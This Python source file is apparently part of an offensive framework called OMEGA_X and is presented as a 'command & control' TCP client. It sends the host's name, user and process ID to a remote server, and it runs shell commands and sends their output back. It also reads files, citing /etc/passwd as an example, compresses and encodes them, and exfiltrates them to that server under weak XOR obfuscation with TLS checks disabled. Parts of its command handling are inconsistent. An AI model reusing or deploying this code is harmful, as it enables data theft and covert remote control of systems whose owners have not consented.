#!/usr/bin/env python3
"""
OMEGA_X TCP Client
==================

Advanced TCP client for OMEGA_X cyber exploitation framework.
Features secure communication, command execution, and data exfiltration.

USAGE:
    python3 tcp_client.py --host <server_ip> --port <port> [--ssl] [--proxy <proxy_addr>]

FEATURES:
- Secure SSL/TLS communication
- Proxy chain support
- Command execution capabilities
- Data exfiltration
- Stealth mode operations
- Cross-platform compatibility

AUTHOR: OMEGA_X Development Team
"""

import socket
import ssl
import threading
import time
import os
import sys
import argparse
import json
import base64
import hashlib
from datetime import datetime
import subprocess

# OMEGA_X imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from omega_launcher import Colors

class OMEGATCPClient:
    """Advanced TCP client for OMEGA_X operations"""

    def __init__(self, host, port, use_ssl=False, proxy=None, stealth_mode=True):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.proxy = proxy
        self.stealth_mode = stealth_mode

        self.socket = None
        self.ssl_socket = None
        self.connected = False
        self.session_id = self.generate_session_id()

        # Client configuration
        self.config = {
            'buffer_size': 4096,
            'timeout': 30,
            'max_retries': 3,
            'heartbeat_interval': 60,
            'encryption_key': 'omega_x_secure_key_2024'
        }

        # Statistics
        self.stats = {
            'bytes_sent': 0,
            'bytes_received': 0,
            'commands_executed': 0,
            'start_time': datetime.now()
        }

    def generate_session_id(self):
        """Generate unique session identifier"""
        timestamp = str(time.time())
        random_data = os.urandom(16).hex()
        session_string = f"{timestamp}_{random_data}"
        return hashlib.sha256(session_string.encode()).hexdigest()[:16]

    def connect(self):
        """Establish connection to server"""
        try:
            print(f"{Colors.BLUE}🔗 Connecting to {self.host}:{self.port}...{Colors.ENDC}")

            # Create socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.config['timeout'])

            # Connect through proxy if specified
            if self.proxy:
                self.connect_through_proxy()
            else:
                self.socket.connect((self.host, self.port))

            # Wrap with SSL if requested
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self.ssl_socket = context.wrap_socket(self.socket, server_hostname=self.host)
                connection = self.ssl_socket
            else:
                connection = self.socket

            # Send handshake
            handshake = {
                'type': 'handshake',
                'session_id': self.session_id,
                'client_info': {
                    'platform': sys.platform,
                    'hostname': socket.gethostname(),
                    'username': os.getenv('USER') or os.getenv('USERNAME'),
                    'pid': os.getpid()
                },
                'capabilities': ['command_execution', 'data_exfiltration', 'file_transfer']
            }

            self.send_message(connection, handshake)

            # Receive handshake response
            response = self.receive_message(connection)
            if response and response.get('type') == 'handshake_ack':
                self.connected = True
                print(f"{Colors.GREEN}✅ Connected successfully (Session: {self.session_id}){Colors.ENDC}")

                # Start heartbeat thread
                heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
                heartbeat_thread.start()

                return True
            else:
                print(f"{Colors.RED}❌ Handshake failed{Colors.ENDC}")
                return False

        except Exception as e:
            print(f"{Colors.RED}❌ Connection failed: {e}{Colors.ENDC}")
            return False

    def connect_through_proxy(self):
        """Connect through proxy server"""
        try:
            proxy_host, proxy_port = self.proxy.rsplit(':', 1)
            proxy_port = int(proxy_port)

            print(f"{Colors.BLUE}🌐 Connecting through proxy {proxy_host}:{proxy_port}{Colors.ENDC}")

            # Connect to proxy
            self.socket.connect((proxy_host, proxy_port))

            # Send CONNECT request for TCP tunneling
            connect_request = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
            self.socket.send(connect_request.encode())

            # Receive proxy response
            response = self.socket.recv(4096).decode()
            if "200 Connection established" in response:
                print(f"{Colors.GREEN}✅ Proxy connection established{Colors.ENDC}")
            else:
                raise Exception(f"Proxy connection failed: {response}")

        except Exception as e:
            print(f"{Colors.RED}❌ Proxy connection failed: {e}{Colors.ENDC}")
            raise

    def heartbeat_loop(self):
        """Send periodic heartbeat to maintain connection"""
        while self.connected:
            try:
                heartbeat = {
                    'type': 'heartbeat',
                    'session_id': self.session_id,
                    'timestamp': datetime.now().isoformat()
                }

                connection = self.ssl_socket if self.use_ssl else self.socket
                self.send_message(connection, heartbeat)
                time.sleep(self.config['heartbeat_interval'])

            except Exception as e:
                print(f"{Colors.YELLOW}⚠️  Heartbeat failed: {e}{Colors.ENDC}")
                break

    def send_message(self, connection, message):
        """Send JSON message with encryption"""
        try:
            # Serialize and encrypt message
            message_json = json.dumps(message)
            encrypted_message = self.encrypt_message(message_json)
            message_length = len(encrypted_message)

            # Send message length first (4 bytes)
            connection.send(message_length.to_bytes(4, byteorder='big'))

            # Send encrypted message
            connection.send(encrypted_message.encode())

            self.stats['bytes_sent'] += message_length + 4

        except Exception as e:
            print(f"{Colors.RED}❌ Send failed: {e}{Colors.ENDC}")
            raise

    def receive_message(self, connection):
        """Receive and decrypt JSON message"""
        try:
            # Receive message length (4 bytes)
            length_bytes = connection.recv(4)
            if not length_bytes:
                return None

            message_length = int.from_bytes(length_bytes, byteorder='big')

            # Receive encrypted message
            encrypted_message = connection.recv(message_length).decode()
            if not encrypted_message:
                return None

            # Decrypt and parse
            decrypted_message = self.decrypt_message(encrypted_message)
            message = json.loads(decrypted_message)

            self.stats['bytes_received'] += message_length + 4

            return message

        except Exception as e:
            print(f"{Colors.RED}❌ Receive failed: {e}{Colors.ENDC}")
            return None

    def encrypt_message(self, message):
        """Simple encryption for messages (can be enhanced)"""
        # This is a basic XOR encryption - in production, use proper encryption
        key = self.config['encryption_key']
        encrypted = ""
        for i, char in enumerate(message):
            key_char = key[i % len(key)]
            encrypted += chr(ord(char) ^ ord(key_char))
        return base64.b64encode(encrypted.encode()).decode()

    def decrypt_message(self, encrypted_message):
        """Decrypt received message"""
        key = self.config['encryption_key']
        decoded = base64.b64decode(encrypted_message).decode()
        decrypted = ""
        for i, char in enumerate(decoded):
            key_char = key[i % len(key)]
            decrypted += chr(ord(char) ^ ord(key_char))
        return decrypted

    def execute_command(self, command):
        """Execute command and return results"""
        try:
            print(f"{Colors.BLUE}⚡ Executing: {command}{Colors.ENDC}")

            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )

            output = result.stdout
            error = result.stderr
            return_code = result.returncode

            self.stats['commands_executed'] += 1

            return {
                'success': return_code == 0,
                'output': output,
                'error': error,
                'return_code': return_code
            }

        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': '',
                'error': 'Command timed out',
                'return_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }

    def exfiltrate_data(self, file_path):
        """Exfiltrate file data"""
        try:
            if not os.path.exists(file_path):
                return {'success': False, 'error': 'File not found'}

            with open(file_path, 'rb') as f:
                file_data = f.read()

            # Compress and encode
            import gzip
            compressed_data = gzip.compress(file_data)
            encoded_data = base64.b64encode(compressed_data).decode()

            file_info = {
                'filename': os.path.basename(file_path),
                'size': len(file_data),
                'compressed_size': len(compressed_data),
                'data': encoded_data
            }

            return {'success': True, 'file_info': file_info}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def run_interactive_session(self):
        """Run interactive command session"""
        print(f"{Colors.GREEN}🎮 OMEGA_X TCP Client Interactive Session{Colors.ENDC}")
        print(f"{Colors.BLUE}Session ID: {self.session_id}{Colors.ENDC}")
        print(f"{Colors.YELLOW}Type 'help' for commands, 'exit' to quit{Colors.ENDC}")
        print()

        connection = self.ssl_socket if self.use_ssl else self.socket

        while self.connected:
            try:
                # Get user input
                command = input(f"{Colors.GREEN}OMEGA_TCP>{Colors.ENDC} ").strip()

                if not command:
                    continue

                if command.lower() in ['exit', 'quit']:
                    break

                if command.lower() == 'help':
                    self.show_help()
                    continue

                if command.lower().startswith('exfiltrate '):
                    # Handle file exfiltration
                    file_path = command[11:].strip()
                    result = self.exfiltrate_data(file_path)

                    if result['success']:
                        # Send exfiltration request
                        request = {
                            'type': 'exfiltrate',
                            'session_id': self.session_id,
                            'file_info': result['file_info']
                        }
                        self.send_message(connection, request)
                        print(f"{Colors.GREEN}✅ File exfiltration request sent{Colors.ENDC}")
                    else:
                        print(f"{Colors.RED}❌ Exfiltration failed: {result.get('error', 'Unknown error')}{Colors.ENDC}")

                else:
                    # Execute command locally
                    result = self.execute_command(command)

                    # Send command result to server
                    response = {
                        'type': 'command_result',
                        'session_id': self.session_id,
                        'command': command,
                        'result': result
                    }

                    self.send_message(connection, response)

                    # Display result locally
                    if result['success']:
                        if result['output']:
                            print(result['output'])
                    else:
                        print(f"{Colors.RED}Error: {result['error']}{Colors.ENDC}")

            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}⚠️  Session interrupted{Colors.ENDC}")
                break
            except Exception as e:
                print(f"{Colors.RED}❌ Session error: {e}{Colors.ENDC}")
                break

    def show_help(self):
        """Show available commands"""
        help_text = """
OMEGA_X TCP Client Commands:
============================

Basic Commands:
  help              Show this help
  exit/quit         Exit the session

Command Execution:
  <any_command>     Execute command on local system

Data Exfiltration:
  exfiltrate <file> Send file to server

System Commands:
  status            Show client status
  stats             Show session statistics

Examples:
  ls -la
  ps aux
  exfiltrate /etc/passwd
  status
"""
        print(help_text)

    def show_status(self):
        """Show client status"""
        status = {
            'connected': self.connected,
            'session_id': self.session_id,
            'server': f"{self.host}:{self.port}",
            'ssl_enabled': self.use_ssl,
            'proxy': self.proxy,
            'uptime': str(datetime.now() - self.stats['start_time'])
        }

        print(f"{Colors.BLUE}Client Status:{Colors.ENDC}")
        for key, value in status.items():
            print(f"  {key}: {value}")

    def show_stats(self):
        """Show session statistics"""
        print(f"{Colors.BLUE}Session Statistics:{Colors.ENDC}")
        print(f"  Bytes Sent: {self.stats['bytes_sent']}")
        print(f"  Bytes Received: {self.stats['bytes_received']}")
        print(f"  Commands Executed: {self.stats['commands_executed']}")
        print(f"  Uptime: {datetime.now() - self.stats['start_time']}")

    def disconnect(self):
        """Disconnect from server"""
        try:
            if self.connected:
                # Send disconnect message
                disconnect_msg = {
                    'type': 'disconnect',
                    'session_id': self.session_id
                }

                connection = self.ssl_socket if self.use_ssl else self.socket
                self.send_message(connection, disconnect_msg)

                self.connected = False

                # Close sockets
                if self.ssl_socket:
                    self.ssl_socket.close()
                if self.socket:
                    self.socket.close()

                print(f"{Colors.YELLOW}🔌 Disconnected from server{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.RED}❌ Disconnect error: {e}{Colors.ENDC}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="OMEGA_X TCP Client")
    parser.add_argument('--host', required=True, help='Server hostname/IP')
    parser.add_argument('--port', type=int, default=4444, help='Server port (default: 4444)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/TLS encryption')
    parser.add_argument('--proxy', help='Proxy server (host:port)')
    parser.add_argument('--stealth', action='store_true', default=True, help='Enable stealth mode')

    args = parser.parse_args()

    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.CYAN}║{Colors.ENDC}                    {Colors.RED}🔗 OMEGA_X TCP CLIENT 🔗{Colors.ENDC}                     {Colors.CYAN}║{Colors.ENDC}")
    print(f"{Colors.CYAN}║{Colors.ENDC}              {Colors.YELLOW}SECURE COMMAND & CONTROL CLIENT{Colors.ENDC}                {Colors.CYAN}║{Colors.ENDC}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}")

    # Create client
    client = OMEGATCPClient(
        host=args.host,
        port=args.port,
        use_ssl=args.ssl,
        proxy=args.proxy,
        stealth_mode=args.stealth
    )

    try:
        # Connect to server
        if client.connect():
            # Run interactive session
            client.run_interactive_session()
        else:
            print(f"{Colors.RED}❌ Failed to connect to server{Colors.ENDC}")
            sys.exit(1)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}🛑 Client interrupted by user{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}❌ Client error: {e}{Colors.ENDC}")
        sys.exit(1)
    finally:
        client.disconnect()

if __name__ == "__main__":
    main()